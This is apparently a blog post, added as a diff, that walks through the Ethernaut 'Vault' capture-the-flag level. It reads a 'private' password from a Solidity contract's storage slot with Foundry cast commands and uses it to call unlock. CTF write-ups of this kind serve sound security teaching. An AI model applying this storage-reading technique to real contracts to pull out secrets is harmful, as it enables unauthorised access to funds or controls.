@@ -1,0 +1,64 @@
+---
+title: Ethernaut - Vault - Solution
+date: '2024-05-06'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Vault CTF
+---
+
+# Ethernaut - Vault - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Vault {
+    bool public locked;
+    bytes32 private password;
+
+    constructor(bytes32 _password) {
+        locked = true;
+        password = _password;
+    }
+
+    function unlock(bytes32 _password) public {
+        if (password == _password) {
+            locked = false;
+        }
+    }
+}
+```
+
+## Exploit
+
+The goal of this level is to unlock the vault by providing the correct password.
+
+First, recall that while marking a variable as `private` prevents other contracts from accessing it, it does not mean that the value of this variable is not publicly accessible.
+In fact, we can easily inspect `password` by accessing the storage slot with index 1 (index 0 stores the `locked` state) using [Cast](https://book.getfoundry.sh/cast/):
+
+```bash
+cast storage --rpc-url=<your rpc url> <your level instance address> 1
+```
+
+This tells us that the correct password is `0x412076657279207374726f6e67207365637265742070617373776f7264203a29`.
+
+_**Note** For the fun of it, we can  convert this from `bytes32` to ASCII via:_
+
+```bash
+# Returns "A very strong secret password :)"
+cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+```
+
+To complete the level, we can simply call the unlock function using the above password as the function parameter:
+
+```bash
+cast send <your level instance address> "unlock(bytes32)" "0x412076657279207374726f6e67207365637265742070617373776f7264203a29" --private-key <your private key> --rpc-url <your rpc url> --gas-price <a sufficiently high gas price>
+```
+
+_**Note** You can check the current gas price via:_
+
+```bash
+cast gas-price --rpc-url <your rpc url>
+```
